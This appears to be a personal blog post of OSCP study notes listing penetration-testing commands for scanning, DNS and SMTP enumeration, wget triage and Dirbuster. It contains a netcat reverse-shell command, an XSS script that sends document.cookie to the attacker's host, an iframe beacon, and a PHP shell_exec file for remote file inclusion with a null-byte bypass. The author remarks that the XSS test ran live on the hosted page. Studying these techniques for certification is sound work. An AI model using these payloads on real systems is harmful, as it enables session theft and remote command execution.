---
layout: post
title: OSCP Notes
---

## BLUF  
"Bottom Line Up Front" for the non-military types. Honestly I just want to get my notes onto the interwebs and off my VM. I've 
done a lot of bash scripting in OSCP that is super useful, but I can't always remember the syntax. Here's to fixing that. I'll do another blog post tomorrow when I'm not half asleep.  
Edit: After posting this my JS XSS tester executed. Kinda surprising that Github lets you incorporate XSS into a site they host. 
Maybe it's just a don't ask don't tell policy? Gotta put some filler in to stop the code from executing since it would probably 
freak out any onlookers.

## Meat and Potatoes  

### Starting OSCP Work  

Example OpenVPN firewall - /usr/share/doc/openvpn/examples/sample-config-files/firewall.sh
Add firewall rules - iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
Plink (was told to locate) /usr/share/windows-binaries/plink.exe
Keepnote keepnote for note taking on boxes
If there is firewall issues, try pushing the cmd line from the remote host by passing nc -nv [IP] [Port] -e cmd.exe from remote end and setting up a listener to catch it
recon-ng for passive information gathering

### NMAP/ NC Info Gathering  

root@kali:~/OSCP# nc -nvv -w 1 -z 10.11.23.156 3385-3395 (full TCP handshake scan using NC)
root@kali:~/OSCP# nc -unvv -w 1 -z 10.11.23.156 160-165 (UDP scan using NC)
/usr/share/nmap (location of nmap config files)

### Get top UDP ports (over .01 usage according to NMAP)  

cat /usr/share/nmap/nmap-services | grep '/udp'| cut -f2,3 -d$'\t'| sort -k2 -r | head -n 80 | cut -f1 -d'/'

### DNS  

host -t ns [domain_name] (to find name servers for given domain)
host -t mx [domain_name] (to find mail exchange servers for given domain)
for ip in $(cat NMAP/alives.txt); do dnsrecon -d $ip -t axfr; done

### SMTP/MIB  

cat mib-values | cut -f1 -d$'\t' (to cut from tab delimited)
tail -n +1 10.* (cat all files in a directory with the filename as a header)
for ip in $(cat smtp-open.txt); do for user in $(cat users.txt) ; do ./vrfy.py $ip $user; done; done | grep ^"250" > smtp_open_connected_users & (to find SMTP users who have successfully connected)
for ip in $(cat NMAP/alives.txt); do nc -nv $ip 25; done (to test SMTP connection using nc [not as good as python script])
for ip in $(ls | cut -c1-11 | uniq); do mkdir $ip ; done (to creat folders for each ip address in the SNMP directory)

### WGET  

#### To find the ips with information returned from WGET  
tail -n +1 ./WGET/*/* | grep connected | cut -f3 -d' '| sort -u | cut -f4 -d'.' | cut -f1 -d':' | sort -u > ./WGET/web_vuln_ips
 
#### For moving vulnerable IPs to seperate folder  
for ip in $(cat web_vuln_ips); do  mv 10.11.1.$ip 'Vulnerable Servers'; done 

#### To get list of vulnerable files downloaded  
for ip in $(cat ./WGET/web_vuln_ips); do  tail -n +1 ./WGET/$ip/* | grep 10.11.1.$ip/; done

### XSS Commands

#### Test  
"<iframe SRC="(use your IP):(Port to listen on) /report" height="0" width="0"></iframe>
</script>alert("XSS through Javascript, success");</script>"

#### Cookie Stealing Inject  
<script>new Image().src="http://(use your IP):81 /bogus.php?output="+document.cookie;</script>

#### Malicious php code to host on local box  
echo '<?php echo shell_exec("ipconfig");?>' > /var/www/html/evil.txt

##### Then place the appropriate url in place of the php element  
http://(local ip)/evil.txt  

#### Then monitor Apache log once the above has been placed in URL
tail -f /var/log/apache2/access.log  

###### If php is adding unnecessary values, php 5.3 and below are vulnerable to terminating characters with null character
http://(local ip)/evil.txt%00  
  
### Dirbuster  
Wordlist - /usr/share/dirbuster/wordlists/directory-list-1.0.txt (one shown in OSCP video)
Deselect "Brute Force Files" & "Be Recursive"
Set number of threads to 70+
